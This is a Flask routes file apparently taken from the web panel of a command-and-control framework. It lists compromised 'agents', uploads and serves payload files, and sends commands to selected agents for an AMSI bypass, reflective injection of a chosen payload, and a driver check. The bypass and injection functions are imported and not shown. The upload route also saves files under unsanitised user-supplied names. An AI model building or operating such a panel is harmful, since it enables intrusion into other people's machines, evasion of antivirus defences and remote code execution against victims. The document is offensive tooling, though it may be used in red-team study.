from apps.home import blueprint
from flask import render_template, request, jsonify, redirect, url_for, send_from_directory, session
# from flask_login import login_required
# from jinja2 import TemplateNotFound
from apps import db
from apps.home.db import allAgents, operationResults
from c2server.server import *
from apps.exploit.operation import *
import os
import socket
# from exploit import attacker

@blueprint.route('/')
def index():
    agents = allAgents.query.all()
    allResults = operationResults.query.all()
    return render_template('home/index.html', segment='index', agents=agents, results=allResults) 

@blueprint.route('/operations.html')
def operations():
    agents = allAgents.query.all()
    directory = './apps/exploit/payload'
    files = [{'name': file.name} for file in os.scandir(directory)]
    return render_template('home/operations.html', segment='operations', agents=agents, files=files)

@blueprint.route('/agents.html', methods=["GET"])
def agents_info():
    agents = allAgents.query.all()
    return render_template('home/agents.html', segment='agents', agents=agents)

@blueprint.route('/reports.html', methods=["GET"])
def reports():
    agents = allAgents.query.all()
    allResults = operationResults.query.all()
    return render_template('home/reports.html', segment='reports', agents=agents, results=allResults)

@blueprint.route('/payloads.html', methods=["GET"])
def payloads():
    return render_template('home/payloads.html')

@blueprint.route('/upload_payload', methods=["POST"])
def upload_payload():
    directory = './apps/exploit/payload/' 

    file = request.files['file']
    if file.filename == '':
        return """
        <script>
            window.alert("No file was chosen.");
            window.location.href = document.referrer;
        </script>"""
    
    filename = file.filename
    file.save(directory + filename)
    return """
            <script>
                window.alert("File Uploaded Successfully.");
                window.location.href = document.referrer;
            </script>"""

@blueprint.route('/exploit/<filename>', methods=["GET"]) # endpoint for retrieving payload files 
def return_exploit(filename):
    directory = 'exploit/payload'
    return send_from_directory(directory, filename)

@blueprint.route("/update_connections", methods=["GET"])
def update_connections():
    try:
        with connections_lock:
            if connections != []:
                for conn in connections:
                    lastSeen = int(time.time() - conn[2])
                    db.execute("UPDATE all_agents SET lastCheckin=? where identifier=?", (lastSeen, conn[6]))
                db.commit()
            clients = db.execute("SELECT * FROM all_agents").fetchall()
            # Convert list of tuples to list of lists
            clients_list = [list(client) for client in clients]   
        return jsonify({"clients": clients_list})
    except OSError:
        time.sleep(5)

@blueprint.route("/terminate_connections/<id>", methods=["POST"])
def terminate_connections(id):
    client = db.execute("SELECT identifier, status FROM all_agents WHERE id=?", id).fetchone()
    client_id = str(client[0])
    client_status = str(client[1])
    try:
        with connections_lock:
            if client_status == 'Alive' and connections != []:
                for conn in connections:
                    if conn[6] == client_id:
                        conn[1].close()
            db.execute("DELETE FROM all_agents where id=?", id)
            db.commit()
            return redirect(request.referrer)
    except OSError:
        time.sleep(5)

@blueprint.route("/execute_amsi", methods=["POST"])
def execute_amsi():
    arg = request.form.to_dict()
    if arg != {}:
        agent = arg['selected_amsi_agent']
        client_id = db.execute("SELECT identifier FROM all_agents WHERE id=?", agent).fetchone()
        client_id = str(client_id[0])
        try:
            with connections_lock:
                if connections != []:
                    for conn in connections:
                        if conn[6] == client_id:
                            amsi_bypass(conn)
                            return """
                                <script>
                                    window.alert("AMSI Bypass Executed");
                                    window.location.href = document.referrer;
                                </script>"""
                        else:
                            return """
                                <script>
                                    window.alert("No Matching Identifier");
                                    window.location.href = document.referrer;
                                </script>"""
                else:
                    return """
                        <script>
                            window.alert("No Active Connections, Check Agents");
                            window.location.href = document.referrer;
                        </script>"""
        except OSError:
            time.sleep(5)
    else:
        return """
        <script>
            window.alert("No Agent Selected");
            window.location.href = document.referrer;
        </script>"""

@blueprint.route('/execute_reflective', methods=["POST"])
def execute_reflective():
    arg = request.form.to_dict()
    if arg != {}:
        agent = arg['selected_reflective_agent']
        payload = arg['selected_payload']
        client_id = db.execute("SELECT identifier FROM all_agents WHERE id=?", agent).fetchone()
        client_id = str(client_id[0])
        try:
            with connections_lock:
                if connections != []:
                    for conn in connections:
                        if conn[6] == client_id:
                            conn.append(payload)
                            reflectiveInjection(conn)
                            return """
                                <script>
                                    window.alert("Reflective Injection Executed");
                                    window.location.href = document.referrer;
                                </script>"""
                        else:
                            return """
                                <script>
                                    window.alert("No Matching Identifier");
                                    window.location.href = document.referrer;
                                </script>"""
                else:
                    return """
                        <script>
                            window.alert("No Active Connections, Check Agents");
                            window.location.href = document.referrer;
                        </script>"""
        except OSError:
            time.sleep(5)
    else:
        return """
        <script>
            window.alert("No Agent or Payload Selected");
            window.location.href = document.referrer;
        </script>"""

@blueprint.route("/execute_driver", methods=["POST"])
def execute_driver():
    arg = request.form.to_dict()
    if arg != {}:
        agent = arg['selected_driver_agent']
        client_id = db.execute("SELECT identifier FROM all_agents WHERE id=?", agent).fetchone()
        client_id = str(client_id[0])
        try:
            with connections_lock:
                if connections != []:
                    for conn in connections:
                        if conn[6] == client_id:
                            driverCheck(conn)
                            return """
                                <script>
                                    window.alert("Driver Check Executed");
                                    window.location.href = document.referrer;
                                </script>"""
                        else:
                            return """
                                <script>
                                    window.alert("No Matching Identifier");
                                    window.location.href = document.referrer;
                                </script>"""
                else:
                    return """
                        <script>
                            window.alert("No Active Connections, Check Agents");
                            window.location.href = document.referrer;
                        </script>"""
        except OSError:
            time.sleep(5)
    else:
        return """
        <script>
            window.alert("No Agent Selected");
            window.location.href = document.referrer;
        </script>"""
